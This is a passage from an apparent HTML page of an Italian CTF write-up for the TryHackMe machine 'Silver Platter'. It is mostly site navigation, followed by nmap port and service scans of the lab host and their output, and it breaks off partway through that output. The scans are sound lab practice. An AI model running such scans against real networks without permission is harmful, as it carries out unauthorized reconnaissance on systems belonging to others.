@@ -1,0 +1,1554 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="CTF Writeup per Silver Platter (TryHackMe)">
+      
+      
+        <meta name="author" content="favmatteo">
+      
+      
+        <link rel="canonical" href="https://favmatteo.github.io/ctf-writeups/writeups/silver-platter/">
+      
+      
+        <link rel="prev" href="../road/">
+      
+      
+        <link rel="next" href="../support/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.8.0">
+    
+    
+      
+        <title>Silver Platter - [!] ROOT@TERMINAL:~$ CTF Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.57a0d79d.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.fb2fffe2.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="lime">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#silver-platter" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="[!] ROOT@TERMINAL:~$ CTF Writeups" class="md-header__button md-logo" aria-label="[!] ROOT@TERMINAL:~$ CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            [!] ROOT@TERMINAL:~$ CTF Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Silver Platter
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/favmatteo/ctf-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    favmatteo/ctf-writeups
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="[!] ROOT@TERMINAL:~$ CTF Writeups" class="md-nav__button md-logo" aria-label="[!] ROOT@TERMINAL:~$ CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    [!] ROOT@TERMINAL:~$ CTF Writeups
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/favmatteo/ctf-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    favmatteo/ctf-writeups
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Writeups CTF
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Writeups CTF
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-linux-infiltrate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web & Linux - Infiltrate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linux-privesc-kernel-suid/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux - Kernel & SUID PrivEsc
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Archivio Notion
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Archivio Notion
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../0day/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    0day
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../incompleto-paperwork/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [INCOMPLETO] PaperWork
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../agent-sudo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Agent Sudo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../billing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Billing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../convertmyvideo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ConvertMyVideo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dogcat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    dogcat
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../gamingserver/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GamingServer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../jump/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Jump
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mr-robot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mr Robot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../mustacchio/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mustacchio
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../operation-promotion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Operation Promotion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../overpass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overpass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../overpass-3-hosting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overpass 3 - Hosting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pickle-rick/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pickle Rick
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../road/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Road
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Silver Platter
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../support/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Support
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../the-blob-blog/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The Blob Blog
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../the-marketplace/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The Marketplace
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tomghost/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tomghost
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tryheartme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    TryHeartMe
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../watcher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Watcher
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../windows-jump/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Jump
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="silver-platter">Silver Platter<a class="headerlink" href="#silver-platter" title="Permanent link">#</a></h1>
+<p>Iniziamo con enumerare i servizi presenti nella macchina, usando il tool <strong>nmap.</strong></p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
+<span class="normal"><a href="#__codelineno-0-2">2</a></span>
+<span class="normal"><a href="#__codelineno-0-3">3</a></span>
+<span class="normal"><a href="#__codelineno-0-4">4</a></span>
+<span class="normal"><a href="#__codelineno-0-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>kali@kali:~$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-sS<span class="w"> </span>-p-<span class="w"> </span>silver.local<span class="w"> </span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="m">8080</span>/tcp<span class="w"> </span>open<span class="w">  </span>http-proxy
+</span></code></pre></div></td></tr></table></div>
+<p>Per ognuno di questi servizi troviamo la versione</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-1-10">10</a></span>
+<span class="normal"><a href="#__codelineno-1-11">11</a></span>
+<span class="normal"><a href="#__codelineno-1-12">12</a></span>
+<span class="normal"><a href="#__codelineno-1-13">13</a></span>
+<span class="normal"><a href="#__codelineno-1-14">14</a></span>
+<span class="normal"><a href="#__codelineno-1-15">15</a></span>
+<span class="normal"><a href="#__codelineno-1-16">16</a></span>
+<span class="normal"><a href="#__codelineno-1-17">17</a></span>
+<span class="normal"><a href="#__codelineno-1-18">18</a></span>
+<span class="normal"><a href="#__codelineno-1-19">19</a></span>
+<span class="normal"><a href="#__codelineno-1-20">20</a></span>
+<span class="normal"><a href="#__codelineno-1-21">21</a></span>
+<span class="normal"><a href="#__codelineno-1-22">22</a></span>
+<span class="normal"><a href="#__codelineno-1-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>kali@kali:~$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-sS<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p22,80,8080<span class="w"> </span>silver.local
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>ORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">    </span>VERSION
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh<span class="w">        </span>OpenSSH<span class="w"> </span><span class="m">8</span>.9p1<span class="w"> </span>Ubuntu<span class="w"> </span>3ubuntu0.4<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>b4:18:4c:c3:f5:d9:6f:7e:a8:da:2c:5b:ed:1f:2c:6c<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>de:1f:6f:cf:f3:9b:06:4c:c1:87:6f:8d:98:7d:4d:30<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">       </span>nginx<span class="w"> </span><span class="m">1</span>.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a><span class="p">|</span>_http-title:<span class="w"> </span>Hack<span class="w"> </span>Smarter<span class="w"> </span>Security
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a><span class="m">8080</span>/tcp<span class="w"> </span>open<span class="w">  </span>http-proxy
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a><span class="p">|</span>_http-title:<span class="w"> </span>Error
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12"></a><span class="p">|</span><span class="w"> </span>fingerprint-strings:<span class="w"> </span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13"></a><span class="p">|</span><span class="w">   </span>FourOhFourRequest,<span class="w"> </span>GetRequest,<span class="w"> </span>HTTPOptions:<span class="w"> </span>
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14"></a><span class="p">|</span><span class="w">     </span>HTTP/1.1<span class="w"> </span><span class="m">404</span><span class="w"> </span>Not<span class="w"> </span>Found
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15"></a><span class="p">|</span><span class="w">     </span>Connection:<span class="w"> </span>close
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16"></a><span class="p">|</span><span class="w">     </span>Content-Length:<span class="w"> </span><span class="m">74</span>
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17"></a><span class="p">|</span><span class="w">     </span>Content-Type:<span class="w"> </span>text/html
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18"></a><span class="p">|</span><span class="w">     </span>Date:<span class="w"> </span>Thu,<span class="w"> </span><span class="m">05</span><span class="w"> </span>Nov<span class="w"> </span><span class="m">2026</span><span class="w"> </span><span class="m">20</span>:38:46<span class="w"> </span>GMT
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19"></a><span class="p">|</span><span class="w">     </span>&lt;html&gt;&lt;head&gt;&lt;title&gt;Error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;404<span class="w"> </span>-<span class="w"> </span>Not<span class="w"> </span>Found&lt;/body&gt;&lt;/html&gt;
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20"></a><span class="p">|</span><span class="w">   </span>GenericLines,<span class="w"> </span>Help,<span class="w"> </span>Kerberos,<span class="w"> </span>LDAPSearchReq,<span class="w"> </span>LPDString,<span class="w"> </span>RTSPRequest,<span class="w"> </span>SMBProgNeg,<span class="w"> </span>SSLSessionReq,<span class="w"> </span>Socks5,<span class="w"> </span>TLSSessionReq,<span class="w"> </span>TerminalServerCookie:<span class="w"> </span>
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21"></a><span class="p">|</span><span class="w">     </span>HTTP/1.1<span class="w"> </span><span class="m">400</span><span class="w"> </span>Bad<span class="w"> </span>Request
